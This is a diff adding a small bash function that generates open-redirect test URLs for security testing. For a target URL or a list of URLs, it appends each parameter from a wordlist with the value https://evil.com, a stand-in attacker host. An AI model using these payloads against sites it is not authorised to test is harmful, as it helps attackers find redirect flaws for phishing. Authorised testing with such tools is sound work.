@@ -1,0 +1,42 @@
+orgen() {
+    local input="$1"
+    local evil="https://evil.com"
+    local params_file="$BFH_PATH/TXT/openredirectparams"
+
+    # Show usage if no input is given
+    if [[ -z "$1" ]]; then
+        echo "Usage: gen_open_redirect_payloads <url | file_with_urls>"
+        echo "Example:"
+        echo "  gen_open_redirect_payloads https://target.com"
+        echo "  gen_open_redirect_payloads urls.txt"
+        return 1
+    fi
+
+
+    # Check if input starts with http or https
+    if [[ "$input" =~ ^https?:// ]]; then
+        while read -r param; do
+            echo "${input}/?${param}=${evil}"
+        done < "$params_file"
+    elif [[ -f "$input" ]]; then
+        while read -r url; do
+            # Skip empty or comment lines
+            [[ -z "$url" || "$url" =~ ^# ]] && continue
+
+            # Normalize: add https:// if missing
+            if [[ ! "$url" =~ ^https?:// ]]; then
+                url="https://${url}"
+            fi
+
+            while read -r param; do
+                echo "${url}/?${param}=${evil}"
+            done < "$params_file"
+        done < "$input"
+    else
+        echo "[!] Invalid input: '$input'"
+        return 1
+    fi
+
+
+
+}
